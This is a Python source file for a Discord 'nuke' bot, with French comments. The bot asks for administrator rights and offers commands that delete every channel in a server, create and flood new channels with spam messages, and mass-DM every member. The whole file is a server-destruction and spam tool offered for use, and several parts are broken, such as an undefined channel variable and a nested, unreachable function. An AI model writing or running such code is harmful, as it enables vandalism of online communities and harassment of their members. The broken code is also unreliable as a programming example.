import discord
from discord.ext import commands

class DiscordBot(commands.Bot):
    def __init__(self, token):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.members = True
        intents.messages = True
        intents.reactions = True

        super().__init__(command_prefix="!", intents=intents)
        self.token = token

        # Ajouter les commandes au bot
        self.add_command(self.help_command)
        self.add_command(self.nuke_command)
        self.add_command(self.spam_channel)
        self.add_command(self.stop_message_spam)
        self.add_command(self.delete_channels)
        self.add_command(self.send_pm)


    async def on_ready(self):
        await self.change_presence(activity=discord.Game(name="Hosted by YourName"))
        print(f"""
        
 Token  : {self.token}
 Invite : https://discord.com/oauth2/authorize?client_id={self.user.id}&scope=bot&permissions=8
 Name   : {self.user.name}#{self.user.discriminator}
 Prefix : !
 Status : Online""")

    @commands.command(name="help")
    async def help_command(self, ctx):
        """Envoie la liste des commandes disponibles en DM et supprime le message d'origine."""
        print("Commande !help reçue")  # Debug
        try:
            help_message = (
                "Voici les commandes disponibles :\n"
                "!help - Affiche cette aide\n"
                "!nuke - Détruit un serveur en supprimant des canaux et en en créant de nouveaux\n"
                "!spam_channels - Spamme des canaux spécifiques\n"
                "!stop_message_spam - Arrête le spam de messages\n"
                "!delete_channels - Supprime tous les canaux\n"
                "!send_pm - Envoie un message privé à tous les membres\n"
            )
            await ctx.author.send(help_message)
            print(f"Aide envoyée à {ctx.author.name}#{ctx.author.discriminator}")
            await ctx.message.delete()
            print("Message !help supprimé.")
        except discord.Forbidden:
            print(f"Impossible d'envoyer l'aide à {ctx.author.name}#{ctx.author.discriminator} (Accès refusé)")
        except Exception as e:
            print(f"Erreur lors de l'envoi de l'aide : {e}")

    @commands.command(name="nuke")
    async def nuke_command(self, ctx, *, args):
        print("Commande !nuke reçue")  # Debug
        global message_spam
        arguments = [arg.strip() for arg in args.split(',')]
        if len(arguments) < 3:
            await ctx.send("Invalid Argument")
            return
        channels_number = arguments[0]
        channels_name = arguments[1]
        message_spam = arguments[2]
        try:
            int(channels_number)
        except:
            await ctx.send("Invalid Channels Number")
            return
        if len(arguments) > 3:
            message_spam = ", ".join(arguments[2:])
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Channel Deleted: {channel.name} ({channel.id})")
            except Exception as e:
                print(f"Failed to delete channel: {channel.name} ({channel.id}) Error: {e}")
        self.created_channel_ids.clear()
        self.spamming = True
        for i in range(int(channels_number)):
            new_channel = await guild.create_text_channel(channels_name)
            print(f"Channel Created: {channels_name}")
            self.created_channel_ids.append(new_channel.id)
            self.loop.create_task(self.spam_channel(new_channel))


    @commands.command(name="spam_channel")
    async def spam_channel(self, ctx, *, args):
        global message_spam
        global spamming
        while self.spamming:
            try:
                await channel.send(message_spam)
                print(f"Message Sent: {message_spam}")
            except Exception as e:
                    print(f"Failed to send message: {message_spam} Error: {e}")

        async def spam_channels(self, ctx, *, args):
            global message_spam
            arguments = [arg.strip() for arg in args.split(',')]
            if len(arguments) < 3:
                await ctx.send("Invalid Argument")
                return
            channels_number = arguments[0]
            channels_name = arguments[1]
            message_spam = arguments[2]
            try:
                int(channels_number)
            except:
                await ctx.send("Invalid Channels Number")
                return
            if len(arguments) > 3:
                message_spam = ", ".join(arguments[2:])
            guild = ctx.guild
            self.spamming = True
            for i in range(int(channels_number)):
                new_channel = await guild.create_text_channel(channels_name)
                print(f"Channel Created: {channels_name}")
                self.created_channel_ids.append(new_channel.id)
                self.loop.create_task(self.spam_channel(new_channel))
                
    @commands.command(name="stop_message_spam")
    async def stop_message_spam(self, ctx):
        self.spamming = False
        await ctx.send("Spam Stopped.")

    @commands.command(name="delete_channels")
    async def delete_channels(self, ctx):
        self.spamming = False
        await ctx.send("Spam Stopped.")
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Channel Deleted: {channel.name} ({channel.id})")
            except Exception as e:
                print(f"Failed to delete channel: {channel.name} ({channel.id}) Error: {e}")

    @commands.command(name="send_pm")
    async def send_pm(self, ctx, *, message: str):
        guild = ctx.guild
        async for member in guild.fetch_members(limit=None):
            if member != ctx.author:
                try:
                    await member.send(message)
                    print(f"Sent PM to {member.name}#{member.discriminator} ({member.id})")
                except discord.Forbidden:
                    print(f"Failed to send PM to {member.name}#{member.discriminator} ({member.id}) (Access denied)")
                except Exception as e:
                    print(f"Failed to send PM to {member.name}#{member.discriminator} ({member.id}) Error: {e}")

def nuke_server():
    token = input("Enter bot token: ")
    bot = DiscordBot(token)
    bot.run(token)

if __name__ == "__main__":
    nuke_server()
